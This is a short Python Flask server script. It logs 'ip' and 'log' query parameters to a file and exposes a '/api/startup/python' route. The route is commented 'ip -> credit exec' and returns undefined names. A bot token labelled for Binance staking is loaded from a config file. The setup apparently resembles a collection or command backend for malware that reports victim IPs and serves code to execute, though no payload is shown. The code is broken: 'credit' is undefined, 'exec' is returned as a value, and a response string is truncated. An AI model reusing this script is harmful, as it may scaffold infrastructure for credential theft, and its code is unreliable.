import requests
import json
import pickle
import time
from flask import Flask
from flask import request, jsonify

with open('env.json', 'r') as fp:
    env = json.load(fp)

URL = env["URL"]
bot_token = env["BinanceStakeBot"]
bot_chatID = env["Channel id"]


app = Flask('')


@app.route('/', methods=['GET'])
def home():
    if 'ip' in request.args:
        ip = request.args['ip']
        message = request.args['log']

        with open("data.txt", "a+") as f:
            f.write(f"{ip} - {message}\n")
            f.close()
    return "This Website support the "


@app.route('/api/startup/python', methods=['GET'])
def startup(): # ip -> credit exec
    
    return credit, exec


def run():
    app.run(host='0.0.0.0', port=8080)


run()
